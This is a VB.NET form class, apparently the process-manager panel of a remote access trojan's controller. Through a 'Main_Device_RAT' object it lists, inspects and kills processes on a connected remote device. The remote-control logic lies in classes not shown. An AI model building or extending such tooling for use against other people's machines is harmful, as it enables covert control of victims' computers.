Imports System.Windows.Forms.ListViewItem
Public Class Process_Manager
    Public Rat As New Main_Device_RAT
    Public Id As Long
    Public Sub RefreshMe()
        Form1.Connect()
        Dim Processes As String = Rat.GetProcesses
        ListView1.Items.Clear()
        If Processes.Length > 0 Then
            If Processes.Contains("<") Then
                Dim Processesb() As String = Processes.Split("<")
                For Each pro In Processesb
                    Dim proc() As String = pro.Split(">")
                    Dim item As ListViewItem
                    item = ListView1.Items.Add(proc(0))
                    item.SubItems.Add(proc(1))
                Next
            Else
                Dim proc() As String = Processes.Split(">")
                Dim item As ListViewItem
                item = ListView1.Items.Add(proc(0))
                item.SubItems.Add(proc(1))
            End If
        End If
    End Sub
    Private Sub Process_Manager_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            RefreshMe()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub KillToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KillToolStripMenuItem.Click
        Try
            If ListView1.SelectedItems.Count > 0 Then
                Form1.Connect()
                Rat.Kill(ListView1.SelectedItems(0).Text)
                RefreshMe()
            Else
                MsgBox("Select a File")
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        Try
            RefreshMe()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub GetProcessInfoToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetProcessInfoToolStripMenuItem.Click
        Try
            If ListView1.SelectedItems.Count > 0 Then
                Dim Stro As String = ListView1.SelectedItems(0).SubItems(1).ToString
                Dim Strin() As String = Stro.Split("{")
                Dim Stri() As String = Strin(1).Split("}")
                Dim Id As Long = Stri(0)
                Me.Id = Id
                Form1.Connect()
                Dim Processinfo = Rat.GetProcessInfo(Id.ToString)
                Info.RichTextBox1.Text = ""
                If Processinfo.Length > 0 AndAlso Processinfo.Contains("<") Then
                    Dim infer() As String = Processinfo.Split("<")
                    For Each infor In infer
                        Info.RichTextBox1.Text = Info.RichTextBox1.Text & vbNewLine & infor
                    Next
                ElseIf Processinfo.Length > 0 Then
                    Info.RichTextBox1.Text = Info.RichTextBox1.Text & vbNewLine & Processinfo
                End If
                Info.Show()
            Else
                MsgBox("Select a Process Please")
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
End Class